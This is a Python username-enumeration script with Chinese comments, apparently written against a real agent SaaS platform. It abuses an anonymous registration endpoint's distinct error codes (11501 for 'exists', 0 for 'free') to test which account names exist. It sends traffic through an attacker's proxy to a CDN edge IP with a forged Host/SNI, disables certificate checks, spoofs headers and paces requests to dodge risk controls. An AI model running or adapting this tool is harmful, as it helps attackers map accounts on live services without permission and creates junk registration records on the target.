#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""通用技巧：把「匿名可写的注册/申请接口」当存在性 oracle 用。
   适用条件：注册类接口匿名可达，且对「名字已存在」返回与「成功」不同的业务码
             （也常见于：用户名已占用 / 手机号已注册 / 邀请码无效）。
   判定表（本目标实测，dysaas 代理 SaaS）：
     code  0     -> 账号名空闲（注意：会落一条申请记录，同一名字只能打一次！）
     code  11501 -> 代理账号名已存在
     code  7001  -> 用户名格式有误（顺带泄露 4-15 位数字+小写字母 的命名规则）
   用法：python oracle_username_enum.py <候选名文件>   （每行一个名字）
"""
import json
import sys
import time
import socket
import ssl

# ---- 目标接入参数（换目标时改这里）----
PROXY = ('127.0.0.1', 7892)          # 我方出口代理；直连时改成 None
EDGE = '203.0.113.50'             # CDN 边缘 IP（源站被黑洞时用边缘 + 正确 Host/SNI）
HOST = 'example.com'
PORT = 443
PATH = '/xxa/agent/api/v1/agent/appSave'
HDRS = {
    'clientCode': 'ffty', 'clientItem': 'ffty', 'merchantCode': '1', 'language': 'zh-cn',
    'device': '1', 'pc': '1', 'skinCode': 'a041', 'appid': 'a041', 'source': '60',
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json;charset=UTF-8;',
}
UA = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
      '(KHTML, like Gecko) Chrome/203.0.113.30 Safari/537.36')
EXISTS_CODE = 11501
FREE_CODE = 0
RATE = 1.6                          # 秒；务必 ≥0.5s，有风控的站点用 1.5~2.2s


def post(path, body_bytes, host=HOST, ip=EDGE, port=PORT, t=20):
    h = dict(HDRS)
    h['Host'] = host
    h['User-Agent'] = UA
    h['Connection'] = 'close'
    h['Content-Length'] = str(len(body_bytes))
    req = ('POST %s HTTP/1.1\r\n' % path
           + '\r\n'.join('%s: %s' % (k, v) for k, v in h.items())
           + '\r\n\r\n').encode() + body_bytes
    if PROXY:
        c = socket.create_connection(PROXY, timeout=t)
        c.sendall(('CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n' % (ip, port, ip, port)).encode())
        if b' 200' not in c.recv(200).split(b'\r\n')[0]:
            raise OSError('proxy CONNECT failed')
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(c, server_hostname=host)
    else:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(socket.create_connection((ip, port), timeout=t), server_hostname=host)
    s.sendall(req)
    buf = b''
    s.settimeout(t)
    try:
        while len(buf) < 200000:
            d = s.recv(8192)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    s.close()
    head, _, body = buf.partition(b'\r\n\r\n')
    return head.split(b'\r\n')[0].decode('utf-8', 'ignore'), body.decode('utf-8', 'ignore')


def probe(name, phone_seed='1350001'):
    body = json.dumps({'param': {'name': name,
                                 'password': 'Rt!9a8b7c6d',
                                 'phone': phone_seed + '0000'}},
                      ensure_ascii=False).encode()
    st, txt = post(PATH, body)
    try:
        code = json.loads(txt).get('code')
    except Exception:
        code = None
    if code == EXISTS_CODE:
        verdict = 'EXISTS'
    elif code == FREE_CODE:
        verdict = 'FREE(本次调用已落申请，勿重复打)'
    else:
        verdict = 'OTHER'
    print('%-20s %-8s %-8s %s' % (name, st.replace('HTTP/1.1 ', ''), code, txt[:120].replace('\n', ' ')))
    return name if verdict == 'EXISTS' else None


if __name__ == '__main__':
    cands = [l.strip() for l in open(sys.argv[1], encoding='utf-8') if l.strip()]
    hits = []
    for n in cands:
        h = probe(n)
        if h:
            hits.append(h)
        time.sleep(RATE)
    print('\nEXISTS:', hits)
